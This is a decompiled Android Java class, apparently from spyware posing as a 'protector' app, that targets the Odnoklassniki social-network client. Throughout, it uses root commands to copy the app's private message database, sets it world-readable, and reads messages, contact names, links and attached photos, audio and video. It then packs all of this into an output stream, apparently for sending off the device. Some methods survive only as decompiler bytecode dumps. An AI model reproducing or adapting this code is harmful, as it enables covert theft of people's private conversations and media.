package ru.mobile.protector;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.android.location.PlayService;
import java.io.File;
import java.io.OutputStream;
import java.util.Arrays;

public class OdnoklassnikiRT
{
  private static final byte D_OK_ATTACH = 12;
  private static final byte END_OF_BLOCK = 2;
  private static final byte END_OF_FIELD = 1;
  private static final byte END_OF_LINE = 3;
  private static final byte OK_MES_ID = 10;
  private static final byte START_OF_BLOCK = 99;
  private static final byte UNITEXT_PACKET = 97;
  private static String appDBMessages;
  private static String appDBPath;
  private static String appFilesPath;
  private static final String okDBPath = "/data/data/ru.ok.android/databases/";
  private static final String okDbMessages = "odnklassniki.db";
  
  public OdnoklassnikiRT() {}
  
  private static void AddData(OutputStream paramOutputStream, String paramString)
  {
    if (paramOutputStream == null) {
      return;
    }
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    if (str != null) {}
    try
    {
      paramOutputStream.write(str.getBytes());
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData");
        return;
      }
      try
      {
        paramOutputStream.write(1);
        throw paramString;
      }
      catch (Exception paramOutputStream)
      {
        for (;;)
        {
          EXCEPT(paramOutputStream, "AddData");
        }
      }
    }
    catch (Exception paramString)
    {
      paramString = paramString;
      EXCEPT(paramString, "AddData");
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData");
        return;
      }
    }
    finally {}
  }
  
  private static void EXCEPT(Exception paramException, String paramString)
  {
    PlayService.EXCEPT(paramException, paramString);
  }
  
  private static void FLOG(String paramString)
  {
    PlayService.FLOG(paramString);
  }
  
  public static long Read(Context paramContext, OutputStream paramOutputStream, long paramLong)
  {
    FLOG("1 " + paramLong);
    long l1 = paramLong;
    appDBPath = "/data/data/" + paramContext.getPackageName() + "/databases/";
    appFilesPath = "/data/data/" + paramContext.getPackageName() + "/files/";
    paramContext = null;
    Object localObject2 = paramContext;
    long l2 = l1;
    for (;;)
    {
      try
      {
        if (!copyDB()) {
          break;
        }
        localObject2 = paramContext;
        l2 = l1;
        FLOG("db: " + appDBMessages);
        localObject2 = paramContext;
        l2 = l1;
        SQLiteDatabase localSQLiteDatabase = SQLiteDatabase.openDatabase(appDBMessages, null, 0);
        localObject2 = paramContext;
        l2 = l1;
        Object localObject1 = "SELECT _id, conversation_id, _date, data FROM messages WHERE _date > " + 1000L * paramLong + " ORDER BY _date";
        localObject2 = paramContext;
        l2 = l1;
        FLOG("OK:sql=" + (String)localObject1);
        localObject2 = paramContext;
        l2 = l1;
        Cursor localCursor1 = localSQLiteDatabase.rawQuery((String)localObject1, null);
        if (localCursor1 != null)
        {
          int i = 0;
          localObject2 = localCursor1;
          l2 = l1;
          FLOG("OK:qok");
          localObject2 = localCursor1;
          l2 = l1;
          if (localCursor1.moveToFirst())
          {
            localObject2 = localCursor1;
            l2 = l1;
            FLOG("OK:mtf ok ");
            localObject2 = localCursor1;
            l2 = l1;
            paramOutputStream.write(97);
            localObject2 = localCursor1;
            l2 = l1;
            int j = localCursor1.getInt(localCursor1.getColumnIndex("_id"));
            localObject2 = localCursor1;
            l2 = l1;
            Object localObject3 = localCursor1.getString(localCursor1.getColumnIndex("conversation_id"));
            localObject2 = localCursor1;
            l2 = l1;
            paramLong = localCursor1.getLong(localCursor1.getColumnIndex("_date")) / 1000L;
            localObject2 = localCursor1;
            l2 = paramLong;
            FLOG("OK:date:" + paramLong);
            localObject2 = localCursor1;
            l2 = paramLong;
            paramContext = localCursor1.getBlob(localCursor1.getColumnIndex("data"));
            localObject2 = localCursor1;
            l2 = paramLong;
            String str1 = getTextFromBlob(new String(paramContext));
            localObject2 = localCursor1;
            l2 = paramLong;
            String str2 = getLinkFromBlob(paramContext);
            localObject1 = "";
            paramContext = "";
            localObject2 = localCursor1;
            l2 = paramLong;
            Cursor localCursor2 = localSQLiteDatabase.rawQuery("SELECT data FROM conversations WHERE server_id = '" + (String)localObject3 + "'", null);
            localObject3 = localObject1;
            Object localObject4 = paramContext;
            if (localCursor2 != null)
            {
              localObject2 = localCursor1;
              l2 = paramLong;
              if (localCursor2.moveToFirst())
              {
                localObject2 = localCursor1;
                l2 = paramLong;
                localObject3 = getUserFromBlob(new String(localCursor2.getBlob(localCursor2.getColumnIndex("data"))));
                localObject2 = localCursor1;
                l2 = paramLong;
                localObject4 = getLinkFromBlob(localCursor2.getBlob(localCursor2.getColumnIndex("data")));
                localObject1 = localObject3;
                paramContext = (Context)localObject4;
                localObject2 = localCursor1;
                l2 = paramLong;
                if (((String)localObject4).length() == 34)
                {
                  paramContext = "";
                  localObject1 = localObject3;
                }
              }
              localObject3 = localObject1;
              localObject4 = paramContext;
              localObject2 = localCursor1;
              l2 = paramLong;
              if (!localCursor2.isClosed())
              {
                localObject2 = localCursor1;
                l2 = paramLong;
                localCursor2.close();
                localObject4 = paramContext;
                localObject3 = localObject1;
              }
            }
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, Integer.toString(j));
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, Integer.toString(10));
            localObject2 = localCursor1;
            l2 = paramLong;
            FLOG("OK:userAvatar=[" + (String)localObject4 + "]");
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, (String)localObject4);
            localObject2 = localCursor1;
            l2 = paramLong;
            FLOG("OK:user=[" + (String)localObject3 + "]");
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, (String)localObject3);
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, String.valueOf(paramLong));
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, "");
            localObject2 = localCursor1;
            l2 = paramLong;
            FLOG("OK:message=[" + str1 + "]");
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, str1);
            localObject2 = localCursor1;
            l2 = paramLong;
            FLOG("OK:link=" + str2);
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, str2);
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, "");
            localObject2 = localCursor1;
            l2 = paramLong;
            AddData(paramOutputStream, "");
            localObject2 = localCursor1;
            l2 = paramLong;
            paramOutputStream.write(3);
            i += 1;
            if (i > 200)
            {
              localObject2 = localCursor1;
              l2 = paramLong;
              paramOutputStream.write(2);
              l1 = paramLong;
              localObject2 = localCursor1;
              l2 = l1;
              if (!localCursor1.isClosed())
              {
                localObject2 = localCursor1;
                l2 = l1;
                localCursor1.close();
              }
              localObject2 = localCursor1;
              l2 = l1;
              paramLong = l1;
              if (!localSQLiteDatabase.isOpen()) {
                return paramLong;
              }
              localObject2 = localCursor1;
              l2 = l1;
              localSQLiteDatabase.close();
              paramLong = l1;
              return paramLong;
            }
            l1 = paramLong;
            localObject2 = localCursor1;
            l2 = paramLong;
            if (localCursor1.moveToNext()) {
              continue;
            }
            continue;
          }
          localObject2 = localCursor1;
          l2 = l1;
          FLOG("0 rows");
          continue;
        }
        localObject2 = localCursor1;
      }
      catch (Exception paramContext)
      {
        EXCEPT(paramContext, "Read");
        if ((localObject2 != null) && (!((Cursor)localObject2).isClosed())) {
          ((Cursor)localObject2).close();
        }
        return l2;
      }
      l2 = l1;
      FLOG("Failed to open");
    }
    localObject2 = paramContext;
    l2 = l1;
    FLOG("Failed to copy database");
    paramLong = l1;
    return paramLong;
  }
  
  public static long ReadFile(Context paramContext, OutputStream paramOutputStream, long paramLong)
  {
    FLOG("in time: " + paramLong);
    long l1 = paramLong;
    appDBPath = "/data/data/" + paramContext.getPackageName() + "/databases/";
    appFilesPath = "/data/data/" + paramContext.getPackageName() + "/files/";
    paramContext = null;
    Object localObject1 = paramContext;
    long l2 = l1;
    for (;;)
    {
      Cursor localCursor;
      try
      {
        if (!copyDB()) {
          break label1088;
        }
        localObject1 = paramContext;
        l2 = l1;
        FLOG("db: " + appDBMessages);
        localObject1 = paramContext;
        l2 = l1;
        SQLiteDatabase localSQLiteDatabase = SQLiteDatabase.openDatabase(appDBMessages, null, 0);
        localObject1 = paramContext;
        l2 = l1;
        localCursor = localSQLiteDatabase.rawQuery("SELECT _date, data FROM messages WHERE _date > " + 1000L * paramLong + " ORDER BY _date", null);
        if (localCursor == null) {
          break label1072;
        }
        localObject1 = localCursor;
        l2 = l1;
        if (!localCursor.moveToFirst()) {
          break label1056;
        }
        localObject1 = localCursor;
        l2 = l1;
        paramLong = localCursor.getLong(localCursor.getColumnIndex("_date")) / 1000L;
        localObject1 = localCursor;
        l2 = paramLong;
        if (!localCursor.isNull(localCursor.getColumnIndex("data")))
        {
          localObject1 = localCursor;
          l2 = paramLong;
          paramContext = getFilePathFromBlob(localCursor.getBlob(localCursor.getColumnIndex("data")));
          localObject1 = localCursor;
          l2 = paramLong;
          if (!paramContext.equals(""))
          {
            localObject1 = localCursor;
            l2 = paramLong;
            FLOG("___________________________________________");
            localObject1 = localCursor;
            l2 = paramLong;
            String str = paramContext.substring(7);
            localObject1 = localCursor;
            l2 = paramLong;
            FLOG("filePath: " + str);
            localObject1 = localCursor;
            l2 = paramLong;
            paramContext = new File(str);
            Object localObject2 = paramContext;
            localObject1 = localCursor;
            l2 = paramLong;
            if (str.indexOf("/storage/emulated/0/") > -1)
            {
              localObject2 = paramContext;
              localObject1 = localCursor;
              l2 = paramLong;
              if (!paramContext.exists())
              {
                localObject1 = localCursor;
                l2 = paramLong;
                paramContext = str.replaceFirst("/storage/emulated/0/", "/storage/emulated/legacy/");
                localObject1 = localCursor;
                l2 = paramLong;
                FLOG("0 replaced to legacy " + paramContext);
                localObject1 = localCursor;
                l2 = paramLong;
                localObject2 = new File(paramContext);
              }
            }
            localObject1 = localCursor;
            l2 = paramLong;
            if (((File)localObject2).exists())
            {
              localObject1 = localCursor;
              l2 = paramLong;
              FLOG("writing to fo");
              paramContext = "application/zip";
              localObject1 = localCursor;
              l2 = paramLong;
              str = getFileExtention(((File)localObject2).getName());
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("mpeg")) {
                break label1106;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("mp3"))
              {
                break label1106;
                localObject1 = localCursor;
                l2 = paramLong;
                paramOutputStream.write(99);
                localObject1 = localCursor;
                l2 = paramLong;
                AddData(paramOutputStream, String.valueOf(paramLong));
                localObject1 = localCursor;
                l2 = paramLong;
                AddData(paramOutputStream, Integer.toString(12));
                localObject1 = localCursor;
                l2 = paramLong;
                AddData(paramOutputStream, paramContext);
                localObject1 = localCursor;
                l2 = paramLong;
                AddData(paramOutputStream, ((File)localObject2).getName());
                localObject1 = localCursor;
                l2 = paramLong;
                AddData(paramOutputStream, String.valueOf(((File)localObject2).length()));
                localObject1 = localCursor;
                l2 = paramLong;
                writeFileToOutputStream(paramOutputStream, (File)localObject2);
                localObject1 = localCursor;
                l2 = paramLong;
                paramOutputStream.write(1);
                localObject1 = localCursor;
                l2 = paramLong;
                paramOutputStream.write(3);
                localObject1 = localCursor;
                l2 = paramLong;
                paramOutputStream.write(2);
                l1 = paramLong;
                localObject1 = localCursor;
                l2 = l1;
                if (!localCursor.isClosed())
                {
                  localObject1 = localCursor;
                  l2 = l1;
                  localCursor.close();
                }
                localObject1 = localCursor;
                l2 = l1;
                paramLong = l1;
                if (!localSQLiteDatabase.isOpen()) {
                  break label1113;
                }
                localObject1 = localCursor;
                l2 = l1;
                localSQLiteDatabase.close();
                paramLong = l1;
                break label1113;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("png")) {
                break label1115;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("img")) {
                break label1115;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("jpg")) {
                break label1115;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("jpeg")) {
                break label1115;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("bmp")) {
                break label1115;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("png")) {
                break label1122;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (str.equals("img")) {
                break label1122;
              }
              localObject1 = localCursor;
              l2 = paramLong;
              if (!str.equals("jpg")) {
                continue;
              }
              break label1122;
            }
            localObject1 = localCursor;
            l2 = paramLong;
            FLOG("no file " + ((File)localObject2).getAbsolutePath());
            l1 = paramLong;
            localObject1 = localCursor;
            l2 = paramLong;
            if (localCursor.moveToNext()) {
              continue;
            }
            l1 = paramLong;
            continue;
          }
          localObject1 = localCursor;
          l2 = paramLong;
          FLOG("no path in db");
          continue;
        }
        localObject1 = localCursor;
      }
      catch (Exception paramContext)
      {
        EXCEPT(paramContext, "Read");
        if ((localObject1 != null) && (!((Cursor)localObject1).isClosed())) {
          ((Cursor)localObject1).close();
        }
        return l2;
      }
      l2 = paramLong;
      FLOG("no files");
      continue;
      label1056:
      localObject1 = localCursor;
      l2 = l1;
      FLOG("0 rows");
      continue;
      label1072:
      localObject1 = localCursor;
      l2 = l1;
      FLOG("Failed to open");
      continue;
      label1088:
      localObject1 = paramContext;
      l2 = l1;
      FLOG("Failed to copy database");
      paramLong = l1;
      break label1113;
      label1106:
      paramContext = "audio/mpeg";
      continue;
      label1113:
      return paramLong;
      label1115:
      paramContext = "image/jpeg";
      continue;
      label1122:
      paramContext = "video/3gpp";
    }
  }
  
  /* Error */
  public static byte commandSU(String paramString)
  {
    // Byte code:
    //   0: invokestatic 331	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore 5
    //   5: aconst_null
    //   6: astore 6
    //   8: aconst_null
    //   9: astore 9
    //   11: aconst_null
    //   12: astore 8
    //   14: iconst_0
    //   15: istore_1
    //   16: aload 5
    //   18: ldc_w 333
    //   21: invokevirtual 337	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   24: astore 5
    //   26: aload 5
    //   28: astore 6
    //   30: new 339	java/io/OutputStreamWriter
    //   33: dup
    //   34: aload 5
    //   36: invokevirtual 345	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   39: invokespecial 348	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   42: astore 7
    //   44: aload 7
    //   46: aload_0
    //   47: invokevirtual 350	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   50: aload 7
    //   52: invokevirtual 353	java/io/OutputStreamWriter:flush	()V
    //   55: aload 7
    //   57: invokevirtual 354	java/io/OutputStreamWriter:close	()V
    //   60: aload 7
    //   62: ifnull +151 -> 213
    //   65: aload 7
    //   67: invokevirtual 354	java/io/OutputStreamWriter:close	()V
    //   70: aload 5
    //   72: astore_0
    //   73: aload_0
    //   74: ifnull +24 -> 98
    //   77: bipush 30
    //   79: istore_3
    //   80: iload_3
    //   81: iconst_1
    //   82: isub
    //   83: istore 4
    //   85: iload_3
    //   86: ifgt +81 -> 167
    //   89: iload 4
    //   91: ifgt +7 -> 98
    //   94: aload_0
    //   95: invokevirtual 357	java/lang/Process:destroy	()V
    //   98: iload_1
    //   99: ireturn
    //   100: astore_0
    //   101: aload 6
    //   103: astore 5
    //   105: aload 8
    //   107: astore 6
    //   109: iconst_1
    //   110: istore_2
    //   111: aload 5
    //   113: astore_0
    //   114: iload_2
    //   115: istore_1
    //   116: aload 6
    //   118: ifnull -45 -> 73
    //   121: aload 6
    //   123: invokevirtual 354	java/io/OutputStreamWriter:close	()V
    //   126: aload 5
    //   128: astore_0
    //   129: iload_2
    //   130: istore_1
    //   131: goto -58 -> 73
    //   134: astore_0
    //   135: aload 5
    //   137: astore_0
    //   138: iload_2
    //   139: istore_1
    //   140: goto -67 -> 73
    //   143: astore_0
    //   144: aload 9
    //   146: astore 5
    //   148: aload 5
    //   150: ifnull +8 -> 158
    //   153: aload 5
    //   155: invokevirtual 354	java/io/OutputStreamWriter:close	()V
    //   158: aload_0
    //   159: athrow
    //   160: astore_0
    //   161: aload 5
    //   163: astore_0
    //   164: goto -91 -> 73
    //   167: aload_0
    //   168: invokevirtual 360	java/lang/Process:exitValue	()I
    //   171: pop
    //   172: goto -83 -> 89
    //   175: astore 5
    //   177: ldc2_w 361
    //   180: invokestatic 368	java/lang/Thread:sleep	(J)V
    //   183: iload 4
    //   185: istore_3
    //   186: goto -106 -> 80
    //   189: astore_0
    //   190: iconst_3
    //   191: ireturn
    //   192: astore 5
    //   194: goto -36 -> 158
    //   197: astore_0
    //   198: aload 7
    //   200: astore 5
    //   202: goto -54 -> 148
    //   205: astore_0
    //   206: aload 7
    //   208: astore 6
    //   210: goto -101 -> 109
    //   213: aload 5
    //   215: astore_0
    //   216: goto -143 -> 73
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	219	0	paramString	String
    //   15	125	1	b1	byte
    //   110	29	2	b2	byte
    //   79	107	3	i	int
    //   83	101	4	j	int
    //   3	159	5	localObject1	Object
    //   175	1	5	localIllegalThreadStateException	IllegalThreadStateException
    //   192	1	5	localIOException	java.io.IOException
    //   200	14	5	localObject2	Object
    //   6	203	6	localObject3	Object
    //   42	165	7	localOutputStreamWriter	java.io.OutputStreamWriter
    //   12	94	8	localObject4	Object
    //   9	136	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   16	26	100	java/io/IOException
    //   30	44	100	java/io/IOException
    //   121	126	134	java/io/IOException
    //   16	26	143	finally
    //   30	44	143	finally
    //   65	70	160	java/io/IOException
    //   167	172	175	java/lang/IllegalThreadStateException
    //   94	98	189	java/lang/InterruptedException
    //   167	172	189	java/lang/InterruptedException
    //   177	183	189	java/lang/InterruptedException
    //   153	158	192	java/io/IOException
    //   44	60	197	finally
    //   44	60	205	java/io/IOException
  }
  
  private static boolean copyDB()
  {
    File localFile = new File(appDBPath);
    if (!localFile.exists()) {
      localFile.mkdirs();
    }
    localFile = new File(appFilesPath);
    if (!localFile.exists()) {
      localFile.mkdirs();
    }
    if (!new File("/data/data/ru.ok.android/databases/").exists())
    {
      FLOG("mAgent folder not found");
      return false;
    }
    commandSU("cat /data/data/ru.ok.android/databases/odnklassniki.db > " + appDBPath + "ma_messages.db");
    appDBMessages = appDBPath + "ma_messages.db";
    commandSU("chmod 666 " + appDBMessages);
    return new File(appDBMessages).exists();
  }
  
  public static int findArray(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)
  {
    int j;
    if (paramArrayOfByte2.length > paramArrayOfByte1.length)
    {
      j = -2;
      return j;
    }
    int i = 0;
    label14:
    if (i >= paramArrayOfByte1.length - paramArrayOfByte2.length + 1) {
      return -3;
    }
    int k = 0;
    for (;;)
    {
      if (k >= paramArrayOfByte2.length) {}
      while (paramArrayOfByte1[(i + k)] != paramArrayOfByte2[k])
      {
        j = i;
        if (k == paramArrayOfByte2.length) {
          break;
        }
        i += 1;
        break label14;
      }
      k += 1;
    }
  }
  
  public static String getFileExtention(String paramString)
  {
    return paramString.substring(paramString.lastIndexOf(".") + 1);
  }
  
  private static String getFilePathFromBlob(byte[] paramArrayOfByte)
  {
    try
    {
      int i = findArray(paramArrayOfByte, new byte[] { 102, 105, 108, 101, 58, 47, 47 });
      if (i < 0) {
        return "";
      }
      paramArrayOfByte = new String(Arrays.copyOfRange(paramArrayOfByte, i, i + (paramArrayOfByte[(i - 1)] & 0xFF)));
      return paramArrayOfByte;
    }
    catch (Exception paramArrayOfByte) {}
    return "";
  }
  
  private static String getLinkFromBlob(byte[] paramArrayOfByte)
  {
    try
    {
      int i = findArray(paramArrayOfByte, new byte[] { 104, 116, 116, 112 });
      if (i < 0) {
        return "";
      }
      paramArrayOfByte = new String(Arrays.copyOfRange(paramArrayOfByte, i, i + (paramArrayOfByte[(i - 2)] & 0xFF)));
      return paramArrayOfByte;
    }
    catch (Exception paramArrayOfByte) {}
    return "";
  }
  
  private static String getTextFromBlob(String paramString)
  {
    String str;
    if ((byte)paramString.charAt(0) != 10)
    {
      str = "";
      return str;
    }
    int j = 0;
    int i = 0;
    label108:
    for (;;)
    {
      try
      {
        int k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == 0) {
            return "";
          }
        }
        else
        {
          if ((byte)paramString.charAt(i) != 12) {
            break label108;
          }
          i -= 1;
          continue;
        }
        paramString = paramString.substring(2, i);
        str = paramString;
        if (paramString.length() <= 0) {
          break;
        }
        str = paramString;
        if ((byte)paramString.charAt(0) != 1) {
          break;
        }
        paramString = paramString.substring(1, paramString.length() - 1);
        continue;
        i += 1;
      }
      catch (IndexOutOfBoundsException paramString)
      {
        return "";
      }
    }
  }
  
  private static String getUserFromBlob(String paramString)
  {
    paramString = new StringBuilder(paramString);
    int j = -1;
    int i = 0;
    for (;;)
    {
      try
      {
        int k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == -1) {
            return "";
          }
        }
        else
        {
          if ((byte)paramString.charAt(i) != 18) {
            break label123;
          }
          i += 2;
          continue;
        }
        paramString = paramString.substring(i, paramString.length());
        j = -1;
        i = 0;
        k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == -1) {
            return "";
          }
        }
        else
        {
          if ((byte)paramString.charAt(i) == 24) {
            break label130;
          }
          if ((byte)paramString.charAt(i) != 34) {
            break label133;
          }
          break label130;
        }
        paramString = paramString.substring(0, i);
        return paramString;
      }
      catch (IndexOutOfBoundsException paramString)
      {
        return "";
      }
      label123:
      i += 1;
      continue;
      label130:
      continue;
      label133:
      i += 1;
    }
  }
  
  /* Error */
  private static void writeFileToOutputStream(OutputStream paramOutputStream, File paramFile)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: new 422	java/io/FileInputStream
    //   8: dup
    //   9: aload_1
    //   10: invokespecial 425	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   13: astore_1
    //   14: sipush 4096
    //   17: newarray byte
    //   19: astore_3
    //   20: aload_1
    //   21: aload_3
    //   22: invokevirtual 429	java/io/FileInputStream:read	([B)I
    //   25: istore_2
    //   26: iload_2
    //   27: ifgt +12 -> 39
    //   30: aload_1
    //   31: ifnull +60 -> 91
    //   34: aload_1
    //   35: invokevirtual 430	java/io/FileInputStream:close	()V
    //   38: return
    //   39: aload_0
    //   40: aload_3
    //   41: iconst_0
    //   42: iload_2
    //   43: invokevirtual 433	java/io/OutputStream:write	([BII)V
    //   46: goto -26 -> 20
    //   49: astore_0
    //   50: aload_1
    //   51: ifnull -13 -> 38
    //   54: aload_1
    //   55: invokevirtual 430	java/io/FileInputStream:close	()V
    //   58: return
    //   59: astore_0
    //   60: return
    //   61: astore_0
    //   62: aload_3
    //   63: astore_1
    //   64: aload_1
    //   65: ifnull +7 -> 72
    //   68: aload_1
    //   69: invokevirtual 430	java/io/FileInputStream:close	()V
    //   72: aload_0
    //   73: athrow
    //   74: astore_0
    //   75: return
    //   76: astore_1
    //   77: goto -5 -> 72
    //   80: astore_0
    //   81: goto -17 -> 64
    //   84: astore_0
    //   85: aload 4
    //   87: astore_1
    //   88: goto -38 -> 50
    //   91: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	92	0	paramOutputStream	OutputStream
    //   0	92	1	paramFile	File
    //   25	18	2	i	int
    //   1	62	3	arrayOfByte	byte[]
    //   3	83	4	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   14	20	49	java/lang/Exception
    //   20	26	49	java/lang/Exception
    //   39	46	49	java/lang/Exception
    //   54	58	59	java/io/IOException
    //   5	14	61	finally
    //   34	38	74	java/io/IOException
    //   68	72	76	java/io/IOException
    //   14	20	80	finally
    //   20	26	80	finally
    //   39	46	80	finally
    //   5	14	84	java/lang/Exception
  }
}
